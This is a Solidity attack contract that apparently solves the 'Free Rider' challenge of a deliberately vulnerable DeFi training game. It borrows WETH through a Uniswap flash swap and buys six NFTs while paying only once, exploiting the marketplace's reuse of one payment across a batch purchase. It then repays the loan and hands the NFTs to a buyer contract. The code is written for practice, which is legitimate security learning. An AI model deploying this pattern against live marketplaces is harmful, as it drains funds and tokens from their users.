pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "../WETH9.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../free-rider/FreeRiderBuyer.sol";
import "../DamnValuableNFT.sol";
import "hardhat/console.sol";

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    WETH9 weth;
    FreeRiderNFTMarketplace market;
    FreeRiderBuyer buyer;
    DamnValuableNFT nft;

    constructor(
        WETH9 _weth,
        FreeRiderNFTMarketplace _market,
        FreeRiderBuyer _buyer,
        DamnValuableNFT _nft
    ) {
        weth = _weth;
        market = _market;
        buyer = _buyer;
        nft = _nft;
    }

    function exploit(IUniswapV2Pair pair, uint256 wethAmount) public {
        pair.swap(wethAmount, 0, address(this), "data");
    }

    function uniswapV2Call(
        address sender,
        uint256 wethAmount,
        uint256 amount1,
        bytes calldata data
    ) external override {
        //Flash swap
        weth.withdraw(wethAmount);
        uint256[] memory ids = new uint256[](6);
        for (uint256 i = 0; i < 6; ++i) {
            ids[i] = i;
        }
        market.buyMany{value: wethAmount}(ids);

        weth.deposit{value: address(this).balance}();
        weth.transfer(msg.sender, weth.balanceOf(address(this)));

        for (uint256 i; i < 6; ++i) {
            nft.safeTransferFrom(address(this), address(buyer), i, "");
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
